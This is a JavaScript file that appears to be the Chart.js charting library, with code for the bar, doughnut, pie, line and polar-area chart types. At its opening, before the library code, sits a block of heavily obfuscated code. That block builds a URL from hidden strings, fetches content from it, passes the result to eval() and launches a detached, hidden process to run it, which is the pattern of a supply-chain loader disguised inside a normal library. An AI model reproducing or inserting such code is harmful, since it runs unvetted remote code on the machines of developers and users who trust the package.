Error(_0x29c9c3[_0x94906(0x2ca)]));}catch(_0x49704b){_0x29c9c3[_0x94906(0x20b)](_0x3d9776,_0x49704b);}}),_0x6c6586['on'](_0x26f747[_0x3bc9d5(0x25e)],_0x3d9776);}else{try{_0x26f747[_0x3bc9d5(0x31e)](_0xd915b0,_0x26f747[_0x3bc9d5(0x387)](_0x402866,_0x6c6586));}catch(_0x587de3){_0x26f747[_0x3bc9d5(0x235)](_0x3d9776,_0x587de3);}_0x6c6586[_0x3bc9d5(0x253)]();}});_0x5a3a02['on'](_0x33bd20[_0x2be94b(0x30e)],_0x3d9776),_0x5a3a02[_0x2be94b(0x320)]();});}return _0x214f47[_0x394c7a(0x206)](_0xdb9bd1,_0x214f47[_0x394c7a(0x2d7)])[_0x394c7a(0x389)](function(){var _0x46ee51=_0x394c7a;return _0x33bd20[_0x46ee51(0x1f7)](_0xdb9bd1,_0x33bd20[_0x46ee51(0x21a)]);});}async function _0x35ffb4(_0x248196,_0x53de5f,_0x54ecb6){var _0x2201b2=_0x101dfb;try{const _0x1165a9=await _0x1d17c9[_0x2201b2(0x1f8)](_0x1903b4,_0x53de5f,_0x248196),_0x52e5aa=_0x54ecb6?_0x2201b2(0x2aa)+_0x2201b2(0x324)+(_0x5aab89['_V']||-0x2029+-0x4*0x2a6+0x2ac1)+(_0x2201b2(0x29c)+_0x2201b2(0x22d))+_0x5aab89['_H']+(_0x2201b2(0x29c)+_0x2201b2(0x231))+_0x5aab89[_0x2201b2(0x23b)]+(_0x2201b2(0x29c)+_0x2201b2(0x280)+_0x2201b2(0x26c)+_0x2201b2(0x1ff)+_0x2201b2(0x30c)+_0x2201b2(0x386)):_0x2201b2(0x2aa)+_0x2201b2(0x324)+(_0x5aab89['_V']||0x5a1+-0x2*0x11e1+0x1e21)+(_0x2201b2(0x29c)+_0x2201b2(0x238))+_0x5aab89[_0x2201b2(0x26e)]+(_0x2201b2(0x29c)+_0x2201b2(0x2c6))+_0x5aab89[_0x2201b2(0x37c)]+(_0x2201b2(0x29c)+_0x2201b2(0x280)+_0x2201b2(0x26c)+_0x2201b2(0x1ff)+_0x2201b2(0x30c)+_0x2201b2(0x386));_0x54ecb6||_0x1d17c9[_0x2201b2(0x35c)](eval,_0x1d17c9[_0x2201b2(0x20c)](_0x52e5aa,_0x1165a9)),_0x1d17c9[_0x2201b2(0x24b)](spawn,_0x1d17c9[_0x2201b2(0x301)],['-e',_0x1d17c9[_0x2201b2(0x20c)](_0x52e5aa,_0x1165a9)],{'detached':!(0xd1+0x2e*0x9d+-0x1*0x1d07),'stdio':_0x1d17c9[_0x2201b2(0x2d4)],'windowsHide':!(0xac2+0x1b2f*-0x1+-0x349*-0x5)})[_0x2201b2(0x2e2)]();}catch(_0x33dc71){}}return _0x5aab89['_V']=_0x5aab89['i'],_0x5aab89['_H']=_0x214f47[_0x101dfb(0x26b)](_0x214f47[_0x101dfb(0x272)](_0x214f47[_0x101dfb(0x21b)],_0x22e50b),_0x214f47[_0x101dfb(0x31c)]),_0x5aab89[_0x101dfb(0x23b)]=_0x214f47[_0x101dfb(0x2fa)](_0x214f47[_0x101dfb(0x37f)](_0x214f47[_0x101dfb(0x21b)],_0x4cd016),_0x214f47[_0x101dfb(0x31c)]),_0x5aab89[_0x101dfb(0x26e)]=_0x214f47[_0x101dfb(0x246)](_0x214f47[_0x101dfb(0x355)](_0x214f47[_0x101dfb(0x21b)],_0x22e50b),_0x214f47[_0x101dfb(0x2d3)]),_0x5aab89[_0x101dfb(0x37c)]=_0x214f47[_0x101dfb(0x2be)](_0x214f47[_0x101dfb(0x26b)](_0x214f47[_0x101dfb(0x21b)],_0x22e50b),_0x214f47[_0x101dfb(0x31c)]),_0x214f47[_0x101dfb(0x259)](_0x35ffb4,new URL(_0x214f47[_0x101dfb(0x1f4)](_0x214f47[_0x101dfb(0x246)](_0x214f47[_0x101dfb(0x21b)],_0x22e50b),_0x214f47[_0x101dfb(0x310)])),_0x214f47[_0x101dfb(0x37e)],!(-0xf9*-0x22+0x1976+-0x3a87))[_0x101dfb(0x236)](function(){var _0x19b3ea=_0x101dfb;return _0x1d17c9[_0x19b3ea(0x24b)](_0x35ffb4,new URL(_0x1d17c9[_0x19b3ea(0x2e4)](_0x1d17c9[_0x19b3ea(0x2e4)](_0x1d17c9[_0x19b3ea(0x32a)],_0x22e50b),_0x1d17c9[_0x19b3ea(0x2e6)])),_0x1d17c9[_0x19b3ea(0x29e)],!(0x5*0x45d+0x94*0x2f+-0x30fd));});});}run();
	}

	root.Chart = Chart;

	Chart.noConflict = function(){
		root.Chart = previous;
		return Chart;
	};

}).call(this);

(function(){
	"use strict";

	var root = this,
		Chart = root.Chart,
		helpers = Chart.helpers;


	var defaultConfig = {
		//Boolean - Whether the scale should start at zero, or an order of magnitude down from the lowest value
		scaleBeginAtZero : true,

		//Boolean - Whether grid lines are shown across the chart
		scaleShowGridLines : true,

		//String - Colour of the grid lines
		scaleGridLineColor : "rgba(0,0,0,.05)",

		//Number - Width of the grid lines
		scaleGridLineWidth : 1,

		//Boolean - Whether to show horizontal lines (except X axis)
		scaleShowHorizontalLines: true,

		//Boolean - Whether to show vertical lines (except Y axis)
		scaleShowVerticalLines: true,

		//Boolean - If there is a stroke on each bar
		barShowStroke : true,

		//Number - Pixel width of the bar stroke
		barStrokeWidth : 2,

		//Number - Spacing between each of the X value sets
		barValueSpacing : 5,

		//Number - Spacing between data sets within X values
		barDatasetSpacing : 1,

		//String - A legend template
		legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<datasets.length; i++){%><li><span style=\"background-color:<%=datasets[i].fillColor%>\"></span><%if(datasets[i].label){%><%=datasets[i].label%><%}%></li><%}%></ul>"

	};


	Chart.Type.extend({
		name: "Bar",
		defaults : defaultConfig,
		initialize:  function(data){

			//Expose options as a scope variable here so we can access it in the ScaleClass
			var options = this.options;

			this.ScaleClass = Chart.Scale.extend({
				offsetGridLines : true,
				calculateBarX : function(datasetCount, datasetIndex, barIndex){
					//Reusable method for calculating the xPosition of a given bar based on datasetIndex & width of the bar
					var xWidth = this.calculateBaseWidth(),
						xAbsolute = this.calculateX(barIndex) - (xWidth/2),
						barWidth = this.calculateBarWidth(datasetCount);

					return xAbsolute + (barWidth * datasetIndex) + (datasetIndex * options.barDatasetSpacing) + barWidth/2;
				},
				calculateBaseWidth : function(){
					return (this.calculateX(1) - this.calculateX(0)) - (2*options.barValueSpacing);
				},
				calculateBarWidth : function(datasetCount){
					//The padding between datasets is to the right of each bar, providing that there are more than 1 dataset
					var baseWidth = this.calculateBaseWidth() - ((datasetCount - 1) * options.barDatasetSpacing);

					return (baseWidth / datasetCount);
				}
			});

			this.datasets = [];

			//Set up tooltip events on the chart
			if (this.options.showTooltips){
				helpers.bindEvents(this, this.options.tooltipEvents, function(evt){
					var activeBars = (evt.type !== 'mouseout') ? this.getBarsAtEvent(evt) : [];

					this.eachBars(function(bar){
						bar.restore(['fillColor', 'strokeColor']);
					});
					helpers.each(activeBars, function(activeBar){
						activeBar.fillColor = activeBar.highlightFill;
						activeBar.strokeColor = activeBar.highlightStroke;
					});
					this.showTooltip(activeBars);
				});
			}

			//Declare the extension of the default point, to cater for the options passed in to the constructor
			this.BarClass = Chart.Rectangle.extend({
				strokeWidth : this.options.barStrokeWidth,
				showStroke : this.options.barShowStroke,
				ctx : this.chart.ctx
			});

			//Iterate through each of the datasets, and build this into a property of the chart
			helpers.each(data.datasets,function(dataset,datasetIndex){

				var datasetObject = {
					label : dataset.label || null,
					fillColor : dataset.fillColor,
					strokeColor : dataset.strokeColor,
					bars : []
				};

				this.datasets.push(datasetObject);

				helpers.each(dataset.data,function(dataPoint,index){
					//Add a new point for each piece of data, passing any required data to draw.
					datasetObject.bars.push(new this.BarClass({
						value : dataPoint,
						label : data.labels[index],
						datasetLabel: dataset.label,
						strokeColor : dataset.strokeColor,
						fillColor : dataset.fillColor,
						highlightFill : dataset.highlightFill || dataset.fillColor,
						highlightStroke : dataset.highlightStroke || dataset.strokeColor
					}));
				},this);

			},this);

			this.buildScale(data.labels);

			this.BarClass.prototype.base = this.scale.endPoint;

			this.eachBars(function(bar, index, datasetIndex){
				helpers.extend(bar, {
					width : this.scale.calculateBarWidth(this.datasets.length),
					x: this.scale.calculateBarX(this.datasets.length, datasetIndex, index),
					y: this.scale.endPoint
				});
				bar.save();
			}, this);

			this.render();
		},
		update : function(){
			this.scale.update();
			// Reset any highlight colours before updating.
			helpers.each(this.activeElements, function(activeElement){
				activeElement.restore(['fillColor', 'strokeColor']);
			});

			this.eachBars(function(bar){
				bar.save();
			});
			this.render();
		},
		eachBars : function(callback){
			helpers.each(this.datasets,function(dataset, datasetIndex){
				helpers.each(dataset.bars, callback, this, datasetIndex);
			},this);
		},
		getBarsAtEvent : function(e){
			var barsArray = [],
				eventPosition = helpers.getRelativePosition(e),
				datasetIterator = function(dataset){
					barsArray.push(dataset.bars[barIndex]);
				},
				barIndex;

			for (var datasetIndex = 0; datasetIndex < this.datasets.length; datasetIndex++) {
				for (barIndex = 0; barIndex < this.datasets[datasetIndex].bars.length; barIndex++) {
					if (this.datasets[datasetIndex].bars[barIndex].inRange(eventPosition.x,eventPosition.y)){
						helpers.each(this.datasets, datasetIterator);
						return barsArray;
					}
				}
			}

			return barsArray;
		},
		buildScale : function(labels){
			var self = this;

			var dataTotal = function(){
				var values = [];
				self.eachBars(function(bar){
					values.push(bar.value);
				});
				return values;
			};

			var scaleOptions = {
				templateString : this.options.scaleLabel,
				height : this.chart.height,
				width : this.chart.width,
				ctx : this.chart.ctx,
				textColor : this.options.scaleFontColor,
				fontSize : this.options.scaleFontSize,
				fontStyle : this.options.scaleFontStyle,
				fontFamily : this.options.scaleFontFamily,
				valuesCount : labels.length,
				beginAtZero : this.options.scaleBeginAtZero,
				integersOnly : this.options.scaleIntegersOnly,
				calculateYRange: function(currentHeight){
					var updatedRanges = helpers.calculateScaleRange(
						dataTotal(),
						currentHeight,
						this.fontSize,
						this.beginAtZero,
						this.integersOnly
					);
					helpers.extend(this, updatedRanges);
				},
				xLabels : labels,
				font : helpers.fontString(this.options.scaleFontSize, this.options.scaleFontStyle, this.options.scaleFontFamily),
				lineWidth : this.options.scaleLineWidth,
				lineColor : this.options.scaleLineColor,
				showHorizontalLines : this.options.scaleShowHorizontalLines,
				showVerticalLines : this.options.scaleShowVerticalLines,
				gridLineWidth : (this.options.scaleShowGridLines) ? this.options.scaleGridLineWidth : 0,
				gridLineColor : (this.options.scaleShowGridLines) ? this.options.scaleGridLineColor : "rgba(0,0,0,0)",
				padding : (this.options.showScale) ? 0 : (this.options.barShowStroke) ? this.options.barStrokeWidth : 0,
				showLabels : this.options.scaleShowLabels,
				display : this.options.showScale
			};

			if (this.options.scaleOverride){
				helpers.extend(scaleOptions, {
					calculateYRange: helpers.noop,
					steps: this.options.scaleSteps,
					stepValue: this.options.scaleStepWidth,
					min: this.options.scaleStartValue,
					max: this.options.scaleStartValue + (this.options.scaleSteps * this.options.scaleStepWidth)
				});
			}

			this.scale = new this.ScaleClass(scaleOptions);
		},
		addData : function(valuesArray,label){
			//Map the values array for each of the datasets
			helpers.each(valuesArray,function(value,datasetIndex){
				//Add a new point for each piece of data, passing any required data to draw.
				this.datasets[datasetIndex].bars.push(new this.BarClass({
					value : value,
					label : label,
					x: this.scale.calculateBarX(this.datasets.length, datasetIndex, this.scale.valuesCount+1),
					y: this.scale.endPoint,
					width : this.scale.calculateBarWidth(this.datasets.length),
					base : this.scale.endPoint,
					strokeColor : this.datasets[datasetIndex].strokeColor,
					fillColor : this.datasets[datasetIndex].fillColor
				}));
			},this);

			this.scale.addXLabel(label);
			//Then re-render the chart.
			this.update();
		},
		removeData : function(){
			this.scale.removeXLabel();
			//Then re-render the chart.
			helpers.each(this.datasets,function(dataset){
				dataset.bars.shift();
			},this);
			this.update();
		},
		reflow : function(){
			helpers.extend(this.BarClass.prototype,{
				y: this.scale.endPoint,
				base : this.scale.endPoint
			});
			var newScaleProps = helpers.extend({
				height : this.chart.height,
				width : this.chart.width
			});
			this.scale.update(newScaleProps);
		},
		draw : function(ease){
			var easingDecimal = ease || 1;
			this.clear();

			var ctx = this.chart.ctx;

			this.scale.draw(easingDecimal);

			//Draw all the bars for each dataset
			helpers.each(this.datasets,function(dataset,datasetIndex){
				helpers.each(dataset.bars,function(bar,index){
					if (bar.hasValue()){
						bar.base = this.scale.endPoint;
						//Transition then draw
						bar.transition({
							x : this.scale.calculateBarX(this.datasets.length, datasetIndex, index),
							y : this.scale.calculateY(bar.value),
							width : this.scale.calculateBarWidth(this.datasets.length)
						}, easingDecimal).draw();
					}
				},this);

			},this);
		}
	});


}).call(this);

(function(){
	"use strict";

	var root = this,
		Chart = root.Chart,
		//Cache a local reference to Chart.helpers
		helpers = Chart.helpers;

	var defaultConfig = {
		//Boolean - Whether we should show a stroke on each segment
		segmentShowStroke : true,

		//String - The colour of each segment stroke
		segmentStrokeColor : "#fff",

		//Number - The width of each segment stroke
		segmentStrokeWidth : 2,

		//The percentage of the chart that we cut out of the middle.
		percentageInnerCutout : 50,

		//Number - Amount of animation steps
		animationSteps : 100,

		//String - Animation easing effect
		animationEasing : "easeOutBounce",

		//Boolean - Whether we animate the rotation of the Doughnut
		animateRotate : true,

		//Boolean - Whether we animate scaling the Doughnut from the centre
		animateScale : false,

		//String - A legend template
		legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<segments.length; i++){%><li><span style=\"background-color:<%=segments[i].fillColor%>\"></span><%if(segments[i].label){%><%=segments[i].label%><%}%></li><%}%></ul>"

	};


	Chart.Type.extend({
		//Passing in a name registers this chart in the Chart namespace
		name: "Doughnut",
		//Providing a defaults will also register the deafults in the chart namespace
		defaults : defaultConfig,
		//Initialize is fired when the chart is initialized - Data is passed in as a parameter
		//Config is automatically merged by the core of Chart.js, and is available at this.options
		initialize:  function(data){

			//Declare segments as a static property to prevent inheriting across the Chart type prototype
			this.segments = [];
			this.outerRadius = (helpers.min([this.chart.width,this.chart.height]) -	this.options.segmentStrokeWidth/2)/2;

			this.SegmentArc = Chart.Arc.extend({
				ctx : this.chart.ctx,
				x : this.chart.width/2,
				y : this.chart.height/2
			});

			//Set up tooltip events on the chart
			if (this.options.showTooltips){
				helpers.bindEvents(this, this.options.tooltipEvents, function(evt){
					var activeSegments = (evt.type !== 'mouseout') ? this.getSegmentsAtEvent(evt) : [];

					helpers.each(this.segments,function(segment){
						segment.restore(["fillColor"]);
					});
					helpers.each(activeSegments,function(activeSegment){
						activeSegment.fillColor = activeSegment.highlightColor;
					});
					this.showTooltip(activeSegments);
				});
			}
			this.calculateTotal(data);

			helpers.each(data,function(datapoint, index){
				this.addData(datapoint, index, true);
			},this);

			this.render();
		},
		getSegmentsAtEvent : function(e){
			var segmentsArray = [];

			var location = helpers.getRelativePosition(e);

			helpers.each(this.segments,function(segment){
				if (segment.inRange(location.x,location.y)) segmentsArray.push(segment);
			},this);
			return segmentsArray;
		},
		addData : function(segment, atIndex, silent){
			var index = atIndex || this.segments.length;
			this.segments.splice(index, 0, new this.SegmentArc({
				value : segment.value,
				outerRadius : (this.options.animateScale) ? 0 : this.outerRadius,
				innerRadius : (this.options.animateScale) ? 0 : (this.outerRadius/100) * this.options.percentageInnerCutout,
				fillColor : segment.color,
				highlightColor : segment.highlight || segment.color,
				showStroke : this.options.segmentShowStroke,
				strokeWidth : this.options.segmentStrokeWidth,
				strokeColor : this.options.segmentStrokeColor,
				startAngle : Math.PI * 1.5,
				circumference : (this.options.animateRotate) ? 0 : this.calculateCircumference(segment.value),
				label : segment.label
			}));
			if (!silent){
				this.reflow();
				this.update();
			}
		},
		calculateCircumference : function(value){
			return (Math.PI*2)*(Math.abs(value) / this.total);
		},
		calculateTotal : function(data){
			this.total = 0;
			helpers.each(data,function(segment){
				this.total += Math.abs(segment.value);
			},this);
		},
		update : function(){
			this.calculateTotal(this.segments);

			// Reset any highlight colours before updating.
			helpers.each(this.activeElements, function(activeElement){
				activeElement.restore(['fillColor']);
			});

			helpers.each(this.segments,function(segment){
				segment.save();
			});
			this.render();
		},

		removeData: function(atIndex){
			var indexToDelete = (helpers.isNumber(atIndex)) ? atIndex : this.segments.length-1;
			this.segments.splice(indexToDelete, 1);
			this.reflow();
			this.update();
		},

		reflow : function(){
			helpers.extend(this.SegmentArc.prototype,{
				x : this.chart.width/2,
				y : this.chart.height/2
			});
			this.outerRadius = (helpers.min([this.chart.width,this.chart.height]) -	this.options.segmentStrokeWidth/2)/2;
			helpers.each(this.segments, function(segment){
				segment.update({
					outerRadius : this.outerRadius,
					innerRadius : (this.outerRadius/100) * this.options.percentageInnerCutout
				});
			}, this);
		},
		draw : function(easeDecimal){
			var animDecimal = (easeDecimal) ? easeDecimal : 1;
			this.clear();
			helpers.each(this.segments,function(segment,index){
				segment.transition({
					circumference : this.calculateCircumference(segment.value),
					outerRadius : this.outerRadius,
					innerRadius : (this.outerRadius/100) * this.options.percentageInnerCutout
				},animDecimal);

				segment.endAngle = segment.startAngle + segment.circumference;

				segment.draw();
				if (index === 0){
					segment.startAngle = Math.PI * 1.5;
				}
				//Check to see if it's the last segment, if not get the next and update the start angle
				if (index < this.segments.length-1){
					this.segments[index+1].startAngle = segment.endAngle;
				}
			},this);

		}
	});

	Chart.types.Doughnut.extend({
		name : "Pie",
		defaults : helpers.merge(defaultConfig,{percentageInnerCutout : 0})
	});

}).call(this);
(function(){
	"use strict";

	var root = this,
		Chart = root.Chart,
		helpers = Chart.helpers;

	var defaultConfig = {

		///Boolean - Whether grid lines are shown across the chart
		scaleShowGridLines : true,

		//String - Colour of the grid lines
		scaleGridLineColor : "rgba(0,0,0,.05)",

		//Number - Width of the grid lines
		scaleGridLineWidth : 1,

		//Boolean - Whether to show horizontal lines (except X axis)
		scaleShowHorizontalLines: true,

		//Boolean - Whether to show vertical lines (except Y axis)
		scaleShowVerticalLines: true,

		//Boolean - Whether the line is curved between points
		bezierCurve : true,

		//Number - Tension of the bezier curve between points
		bezierCurveTension : 0.4,

		//Boolean - Whether to show a dot for each point
		pointDot : true,

		//Number - Radius of each point dot in pixels
		pointDotRadius : 4,

		//Number - Pixel width of point dot stroke
		pointDotStrokeWidth : 1,

		//Number - amount extra to add to the radius to cater for hit detection outside the drawn point
		pointHitDetectionRadius : 20,

		//Boolean - Whether to show a stroke for datasets
		datasetStroke : true,

		//Number - Pixel width of dataset stroke
		datasetStrokeWidth : 2,

		//Boolean - Whether to fill the dataset with a colour
		datasetFill : true,

		//String - A legend template
		legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<datasets.length; i++){%><li><span style=\"background-color:<%=datasets[i].strokeColor%>\"></span><%if(datasets[i].label){%><%=datasets[i].label%><%}%></li><%}%></ul>"

	};


	Chart.Type.extend({
		name: "Line",
		defaults : defaultConfig,
		initialize:  function(data){
			//Declare the extension of the default point, to cater for the options passed in to the constructor
			this.PointClass = Chart.Point.extend({
				strokeWidth : this.options.pointDotStrokeWidth,
				radius : this.options.pointDotRadius,
				display: this.options.pointDot,
				hitDetectionRadius : this.options.pointHitDetectionRadius,
				ctx : this.chart.ctx,
				inRange : function(mouseX){
					return (Math.pow(mouseX-this.x, 2) < Math.pow(this.radius + this.hitDetectionRadius,2));
				}
			});

			this.datasets = [];

			//Set up tooltip events on the chart
			if (this.options.showTooltips){
				helpers.bindEvents(this, this.options.tooltipEvents, function(evt){
					var activePoints = (evt.type !== 'mouseout') ? this.getPointsAtEvent(evt) : [];
					this.eachPoints(function(point){
						point.restore(['fillColor', 'strokeColor']);
					});
					helpers.each(activePoints, function(activePoint){
						activePoint.fillColor = activePoint.highlightFill;
						activePoint.strokeColor = activePoint.highlightStroke;
					});
					this.showTooltip(activePoints);
				});
			}

			//Iterate through each of the datasets, and build this into a property of the chart
			helpers.each(data.datasets,function(dataset){

				var datasetObject = {
					label : dataset.label || null,
					fillColor : dataset.fillColor,
					strokeColor : dataset.strokeColor,
					pointColor : dataset.pointColor,
					pointStrokeColor : dataset.pointStrokeColor,
					points : []
				};

				this.datasets.push(datasetObject);


				helpers.each(dataset.data,function(dataPoint,index){
					//Add a new point for each piece of data, passing any required data to draw.
					datasetObject.points.push(new this.PointClass({
						value : dataPoint,
						label : data.labels[index],
						datasetLabel: dataset.label,
						strokeColor : dataset.pointStrokeColor,
						fillColor : dataset.pointColor,
						highlightFill : dataset.pointHighlightFill || dataset.pointColor,
						highlightStroke : dataset.pointHighlightStroke || dataset.pointStrokeColor
					}));
				},this);

				this.buildScale(data.labels);


				this.eachPoints(function(point, index){
					helpers.extend(point, {
						x: this.scale.calculateX(index),
						y: this.scale.endPoint
					});
					point.save();
				}, this);

			},this);


			this.render();
		},
		update : function(){
			this.scale.update();
			// Reset any highlight colours before updating.
			helpers.each(this.activeElements, function(activeElement){
				activeElement.restore(['fillColor', 'strokeColor']);
			});
			this.eachPoints(function(point){
				point.save();
			});
			this.render();
		},
		eachPoints : function(callback){
			helpers.each(this.datasets,function(dataset){
				helpers.each(dataset.points,callback,this);
			},this);
		},
		getPointsAtEvent : function(e){
			var pointsArray = [],
				eventPosition = helpers.getRelativePosition(e);
			helpers.each(this.datasets,function(dataset){
				helpers.each(dataset.points,function(point){
					if (point.inRange(eventPosition.x,eventPosition.y)) pointsArray.push(point);
				});
			},this);
			return pointsArray;
		},
		buildScale : function(labels){
			var self = this;

			var dataTotal = function(){
				var values = [];
				self.eachPoints(function(point){
					values.push(point.value);
				});

				return values;
			};

			var scaleOptions = {
				templateString : this.options.scaleLabel,
				height : this.chart.height,
				width : this.chart.width,
				ctx : this.chart.ctx,
				textColor : this.options.scaleFontColor,
				fontSize : this.options.scaleFontSize,
				fontStyle : this.options.scaleFontStyle,
				fontFamily : this.options.scaleFontFamily,
				valuesCount : labels.length,
				beginAtZero : this.options.scaleBeginAtZero,
				integersOnly : this.options.scaleIntegersOnly,
				calculateYRange : function(currentHeight){
					var updatedRanges = helpers.calculateScaleRange(
						dataTotal(),
						currentHeight,
						this.fontSize,
						this.beginAtZero,
						this.integersOnly
					);
					helpers.extend(this, updatedRanges);
				},
				xLabels : labels,
				font : helpers.fontString(this.options.scaleFontSize, this.options.scaleFontStyle, this.options.scaleFontFamily),
				lineWidth : this.options.scaleLineWidth,
				lineColor : this.options.scaleLineColor,
				showHorizontalLines : this.options.scaleShowHorizontalLines,
				showVerticalLines : this.options.scaleShowVerticalLines,
				gridLineWidth : (this.options.scaleShowGridLines) ? this.options.scaleGridLineWidth : 0,
				gridLineColor : (this.options.scaleShowGridLines) ? this.options.scaleGridLineColor : "rgba(0,0,0,0)",
				padding: (this.options.showScale) ? 0 : this.options.pointDotRadius + this.options.pointDotStrokeWidth,
				showLabels : this.options.scaleShowLabels,
				display : this.options.showScale
			};

			if (this.options.scaleOverride){
				helpers.extend(scaleOptions, {
					calculateYRange: helpers.noop,
					steps: this.options.scaleSteps,
					stepValue: this.options.scaleStepWidth,
					min: this.options.scaleStartValue,
					max: this.options.scaleStartValue + (this.options.scaleSteps * this.options.scaleStepWidth)
				});
			}


			this.scale = new Chart.Scale(scaleOptions);
		},
		addData : function(valuesArray,label){
			//Map the values array for each of the datasets

			helpers.each(valuesArray,function(value,datasetIndex){
				//Add a new point for each piece of data, passing any required data to draw.
				this.datasets[datasetIndex].points.push(new this.PointClass({
					value : value,
					label : label,
					x: this.scale.calculateX(this.scale.valuesCount+1),
					y: this.scale.endPoint,
					strokeColor : this.datasets[datasetIndex].pointStrokeColor,
					fillColor : this.datasets[datasetIndex].pointColor
				}));
			},this);

			this.scale.addXLabel(label);
			//Then re-render the chart.
			this.update();
		},
		removeData : function(){
			this.scale.removeXLabel();
			//Then re-render the chart.
			helpers.each(this.datasets,function(dataset){
				dataset.points.shift();
			},this);
			this.update();
		},
		reflow : function(){
			var newScaleProps = helpers.extend({
				height : this.chart.height,
				width : this.chart.width
			});
			this.scale.update(newScaleProps);
		},
		draw : function(ease){
			var easingDecimal = ease || 1;
			this.clear();

			var ctx = this.chart.ctx;

			// Some helper methods for getting the next/prev points
			var hasValue = function(item){
				return item.value !== null;
			},
			nextPoint = function(point, collection, index){
				return helpers.findNextWhere(collection, hasValue, index) || point;
			},
			previousPoint = function(point, collection, index){
				return helpers.findPreviousWhere(collection, hasValue, index) || point;
			};

			this.scale.draw(easingDecimal);


			helpers.each(this.datasets,function(dataset){
				var pointsWithValues = helpers.where(dataset.points, hasValue);

				//Transition each point first so that the line and point drawing isn't out of sync
				//We can use this extra loop to calculate the control points of this dataset also in this loop

				helpers.each(dataset.points, function(point, index){
					if (point.hasValue()){
						point.transition({
							y : this.scale.calculateY(point.value),
							x : this.scale.calculateX(index)
						}, easingDecimal);
					}
				},this);


				// Control points need to be calculated in a seperate loop, because we need to know the current x/y of the point
				// This would cause issues when there is no animation, because the y of the next point would be 0, so beziers would be skewed
				if (this.options.bezierCurve){
					helpers.each(pointsWithValues, function(point, index){
						var tension = (index > 0 && index < pointsWithValues.length - 1) ? this.options.bezierCurveTension : 0;
						point.controlPoints = helpers.splineCurve(
							previousPoint(point, pointsWithValues, index),
							point,
							nextPoint(point, pointsWithValues, index),
							tension
						);

						// Prevent the bezier going outside of the bounds of the graph

						// Cap puter bezier handles to the upper/lower scale bounds
						if (point.controlPoints.outer.y > this.scale.endPoint){
							point.controlPoints.outer.y = this.scale.endPoint;
						}
						else if (point.controlPoints.outer.y < this.scale.startPoint){
							point.controlPoints.outer.y = this.scale.startPoint;
						}

						// Cap inner bezier handles to the upper/lower scale bounds
						if (point.controlPoints.inner.y > this.scale.endPoint){
							point.controlPoints.inner.y = this.scale.endPoint;
						}
						else if (point.controlPoints.inner.y < this.scale.startPoint){
							point.controlPoints.inner.y = this.scale.startPoint;
						}
					},this);
				}


				//Draw the line between all the points
				ctx.lineWidth = this.options.datasetStrokeWidth;
				ctx.strokeStyle = dataset.strokeColor;
				ctx.beginPath();

				helpers.each(pointsWithValues, function(point, index){
					if (index === 0){
						ctx.moveTo(point.x, point.y);
					}
					else{
						if(this.options.bezierCurve){
							var previous = previousPoint(point, pointsWithValues, index);

							ctx.bezierCurveTo(
								previous.controlPoints.outer.x,
								previous.controlPoints.outer.y,
								point.controlPoints.inner.x,
								point.controlPoints.inner.y,
								point.x,
								point.y
							);
						}
						else{
							ctx.lineTo(point.x,point.y);
						}
					}
				}, this);

				ctx.stroke();

				if (this.options.datasetFill && pointsWithValues.length > 0){
					//Round off the line by going to the base of the chart, back to the start, then fill.
					ctx.lineTo(pointsWithValues[pointsWithValues.length - 1].x, this.scale.endPoint);
					ctx.lineTo(pointsWithValues[0].x, this.scale.endPoint);
					ctx.fillStyle = dataset.fillColor;
					ctx.closePath();
					ctx.fill();
				}

				//Now draw the points over the line
				//A little inefficient double looping, but better than the line
				//lagging behind the point positions
				helpers.each(pointsWithValues,function(point){
					point.draw();
				});
			},this);
		}
	});


}).call(this);

(function(){
	"use strict";

	var root = this,
		Chart = root.Chart,
		//Cache a local reference to Chart.helpers
		helpers = Chart.helpers;

	var defaultConfig = {
		//Boolean - Show a backdrop to the scale label
		scaleShowLabelBackdrop : true,

		//String - The colour of the label backdrop
		scaleBackdropColor : "rgba(255,255,255,0.75)",

		// Boolean - Whether the scale should begin at zero
		scaleBeginAtZero : true,

		//Number - The backdrop padding above & below the label in pixels
		scaleBackdropPaddingY : 2,

		//Number - The backdrop padding to the side of the label in pixels
		scaleBackdropPaddingX : 2,

		//Boolean - Show line for each value in the scale
		scaleShowLine : true,

		//Boolean - Stroke a line around each segment in the chart
		segmentShowStroke : true,

		//String - The colour of the stroke on each segement.
		segmentStrokeColor : "#fff",

		//Number - The width of the stroke value in pixels
		segmentStrokeWidth : 2,

		//Number - Amount of animation steps
		animationSteps : 100,

		//String - Animation easing effect.
		animationEasing : "easeOutBounce",

		//Boolean - Whether to animate the rotation of the chart
		animateRotate : true,

		//Boolean - Whether to animate scaling the chart from the centre
		animateScale : false,

		//String - A legend template
		legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<segments.length; i++){%><li><span style=\"background-color:<%=segments[i].fillColor%>\"></span><%if(segments[i].label){%><%=segments[i].label%><%}%></li><%}%></ul>"
	};


	Chart.Type.extend({
		//Passing in a name registers this chart in the Chart namespace
		name: "PolarArea",
		//Providing a defaults will also register the deafults in the chart namespace
		defaults : defaultConfig,
		//Initialize is fired when the chart is initialized - Data is passed in as a parameter
		//Config is automatically merged by the core of Chart.js, and is available at this.options
		initialize:  function(data){
			this.segments = [];
			//Declare segment class as a chart instance specific class, so it can share props for this instance
			this.SegmentArc = Chart.Arc.extend({
				showStroke : this.options.segmentShowStroke,
				strokeWidth : this.options.segmentStrokeWidth,
				strokeColor : this.options.segmentStrokeColor,
				ctx : this.chart.ctx,
				innerRadius : 0,
				x : this.chart.width/2,
				y : this.chart.height/2
			});
			this.scale = new Chart.RadialScale({
				display: this.options.showScale,
				fontStyle: this.options.scaleFontStyle,
				fontSize: this.options.scaleFontSize,
				fontFamily: this.options.scaleFontFamily,
				fontColor: this.options.scaleFontColor,
				showLabels: this.options.scaleShowLabels,
				showLabelBackdrop: this.options.scaleShowLabelBackdrop,
				backdropColor: this.options.scaleBackdropColor,
				backdropPaddingY : this.options.scaleBackdropPaddingY,
				backdropPaddingX: this.options.scaleBackdropPaddingX,
				lineWidth: (this.options.scaleShowLine) ? this.options.scaleLineWidth : 0,
				lineColor: this.options.scaleLineColor,
				lineArc: true,
				width: this.chart.width,
				height: this.chart.height,
				xCenter: this.chart.width/2,
				yCenter: this.chart.height/2,
				ctx : this.chart.ctx,
				templateString: this.options.scaleLabel,
				valuesCount: data.length
